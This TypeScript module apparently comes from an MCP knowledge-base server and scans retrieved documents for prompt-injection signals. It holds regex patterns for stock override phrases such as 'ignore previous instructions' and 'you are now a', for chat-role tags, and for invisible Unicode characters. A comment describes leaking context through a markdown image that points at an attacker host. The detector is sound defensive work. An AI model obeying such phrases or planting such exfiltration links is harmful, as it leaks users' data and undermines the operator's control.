// Issue #217 — `kb-shield`. Retrieval-time, **signal-only** prompt-injection
// scanner. The threat-model (§2) names content under
// `$KNOWLEDGE_BASES_ROOT_DIR` as a prompt-injection boundary for the
// downstream LLM. This module is the content-layer sibling of
// `sanitizeMetadataForWire` in `formatter.ts`: a pure function applied at the
// wire boundary that surfaces evidence — never redacts.
//
// Design contract:
//   * Pure. No I/O, no global state. The same `(content, ruleset)` always
//     yields the same `InjectionSignal[]`.
//   * Additive. Signals are reported alongside the original chunk; the chunk
//     content is returned to the client unchanged. Downstream MCP clients
//     decide policy.
//   * Versioned ruleset. `KB_SHIELD_RULESET_VERSION` is baked in; future
//     versions add rules without rotating existing rule IDs.
//   * Env switch. `KB_SHIELD=off` disables the scanner; consumers should
//     omit the wire field entirely when disabled so "signal field absent"
//     and "signal field empty array" are distinguishable.

import {
  isUnicodeBidiControl,
  isUnicodeTagControl,
  isZeroWidthControl,
} from './injection-guard.js';

export const KB_SHIELD_RULESET_VERSION = 'v3';

export interface InjectionSignal {
  rule: string;
  span_start: number;
  span_end: number;
}

interface RuleSpec {
  readonly id: string;
  readonly pattern: RegExp;
}

// Frozen v1 ruleset. Each pattern carries the `g` flag so `matchAll` yields every
// hit, and is created with explicit flags rather than inline `(?i)` syntax
// because V8 does not support inline-flag groups.
//
// Rule IDs are dotted to allow future taxonomy expansion
// (`RoleTakeover.*`, `IndirectExfil.*`, `Markup.*`) and form the public
// stable contract surfaced through `injection_signals[].rule`.
const RULES_V1: ReadonlyArray<RuleSpec> = [
  {
    id: 'RoleTakeover.IgnorePriorInstructions',
    pattern: /(ignore|forget|disregard)\s+(all\s+)?(prior|previous|above)\s+instructions?/gi,
  },
  {
    id: 'RoleTakeover.YouAreNow',
    pattern: /you\s+are\s+now\s+(a|an|the)\s+/gi,
  },
  {
    id: 'RoleTakeover.SystemTag',
    pattern: /<\s*\/?\s*system\s*>/gi,  // NOSONAR typescript:S8786 — bounded tag literals, disjoint classes
  },
  {
    id: 'RoleTakeover.ImStart',
    pattern: /<\|im_start\|>/g,
  },
  {
    id: 'RoleTakeover.PseudoRole',
    pattern: /^[ \t]*(system|assistant|user)\s*:\s*/gim,
  },
  {
    id: 'IndirectExfil.JavascriptUrl',
    pattern: /\bjavascript:/gi,
  },
  {
    id: 'IndirectExfil.UntilFurtherNotice',
    pattern: /until\s+further\s+notice,\s+(the\s+)?(user|operator)/gi,
  },
  {
    id: 'Markup.BeginEndPrompt',
    pattern: /(BEGIN|END)\s+PROMPT/g,
  },
];

// v3 markdown URL-sink rules (issue #991). Same regex mechanism as RULES_V1
// and scanned immediately after it, so every v1 span and rule ID is unchanged;
// the only observable effect is two new `IndirectExfil.*` IDs and the
// `KB_SHIELD_RULESET_VERSION` bump to `v3`.
//
// A markdown-rendering MCP client auto-fetches an image URL (and will follow a
// planted link), so a poisoned retrieved chunk can beacon out context through
// an `![x](https://attacker/leak?d=…)` image or a query-string-bearing link —
// the canonical RAG exfiltration channel that previously produced zero signals.
//   * MarkdownImage flags any image whose target is a remote (`http`/`https`)
//     or `data:` URL, because the render auto-fetches it regardless of query.
//   * MarkdownLink is biased toward exfiltration-shaped targets to limit false
//     positives: an inline `[...](http…?…)` link carrying a query string, or a
//     `<http…?…>` autolink. Relative/anchor links (`[d](./x.md)`, `[a](#h)`)
//     and query-less external links do not match.
const MARKDOWN_RULES_V3: ReadonlyArray<RuleSpec> = [
  {
    id: 'IndirectExfil.MarkdownImage',
    pattern: /!\[[^\]]*\]\(\s*(?:https?:|data:)[^)]*\)/gi,
  },
  {
    id: 'IndirectExfil.MarkdownLink',
    // First alternative: inline link, excluded from images via `(?<!!)` so an
    // image is only ever reported once (as MarkdownImage). Requires an http(s)
    // target with a `?` query string. Second alternative: an autolink whose
    // target carries a query string.
    pattern: /(?<!!)\[[^\]]*\]\(\s*https?:\/\/[^)\s]*\?[^)]*\)|<https?:\/\/[^>\s]*\?[^>]*>/gi,
  },
];

// Every regex-based rule, in scan and enumeration order: the frozen v1 set
// followed by the v3 markdown additions. New rule families append here so v1
// IDs, spans, and their relative order stay stable for downstream consumers.
const REGEX_RULES: ReadonlyArray<RuleSpec> = [...RULES_V1, ...MARKDOWN_RULES_V3];

const CONTROL_RULES_V2 = [
  { id: 'Obfuscation.ZeroWidth', matches: isZeroWidthControl },
  { id: 'Obfuscation.BidiControl', matches: isUnicodeBidiControl },
  { id: 'Obfuscation.UnicodeTag', matches: isUnicodeTagControl },
] as const;

/**
 * Scans `content` for known prompt-injection signals and returns each hit as a
 * `{rule, span_start, span_end}` triple. Spans are half-open `[start, end)`
 * UTF-16 code-unit offsets into the input (the same units `String.length`
 * uses), so `content.slice(span_start, span_end)` recovers the matched text.
 * Obfuscation rules flag each control character independently of surrounding
 * text: evidence for review, not proof of malicious intent. Each such span
 * covers one code point (one UTF-16 unit, or two for Unicode tags).
 *
 * The result is sorted deterministically by `(span_start, span_end, rule)` so
 * the output is stable across processes and node versions — useful for
 * snapshot tests and for downstream agents that diff signal sets across
 * runs.
 */
export function scanForInjectionSignals(content: string): InjectionSignal[] {
  if (typeof content !== 'string' || content.length === 0) return [];
  const signals: InjectionSignal[] = [];
  for (const { id, pattern } of REGEX_RULES) {
    // `matchAll` clones the regex internally, so the shared module-level
    // pattern stays stateless across calls. The cast keeps the iterator
    // contract narrow even though `g` is statically present.
    for (const match of content.matchAll(pattern)) {
      const start = match.index ?? 0;
      const matched = match[0];
      if (matched.length === 0) continue; // defensive: never emit empty spans
      signals.push({ rule: id, span_start: start, span_end: start + matched.length });
    }
  }
  let offset = 0;
  for (const char of content) {
    const codepoint = char.codePointAt(0);
    if (codepoint !== undefined) {
      for (const { id, matches } of CONTROL_RULES_V2) {
        if (matches(codepoint)) {
          signals.push({ rule: id, span_start: offset, span_end: offset + char.length });
        }
      }
    }
    offset += char.length;
  }
  signals.sort((a, b) => {
    if (a.span_start !== b.span_start) return a.span_start - b.span_start;
    if (a.span_end !== b.span_end) return a.span_end - b.span_end;
    return a.rule.localeCompare(b.rule);
  });
  return signals;
}

/**
 * Reads `KB_SHIELD` at call time. `off` (case-sensitive, matching the issue
 * spec) disables the scanner; any other value (including unset) leaves it
 * enabled. Tests can flip this by mutating `process.env.KB_SHIELD` directly.
 */
export function isShieldEnabled(): boolean {
  return process.env.KB_SHIELD !== 'off';
}

/**
 * Wire-boundary helper used by `formatter.ts`. Returns `undefined` when the
 * shield is disabled so the JSON field is omitted entirely (preserving the
 * "signal field absent" semantic the issue requires), and an array
 * (possibly empty) when enabled.
 */
export function getInjectionSignals(content: string): InjectionSignal[] | undefined {
  if (!isShieldEnabled()) return undefined;
  return scanForInjectionSignals(content);
}

/**
 * Rule IDs exported for test enumeration and for downstream tooling that
 * wants to validate `injection_signals[].rule` against the known set.
 */
export function listRuleIds(): string[] {
  return [...REGEX_RULES, ...CONTROL_RULES_V2].map((r) => r.id);
}
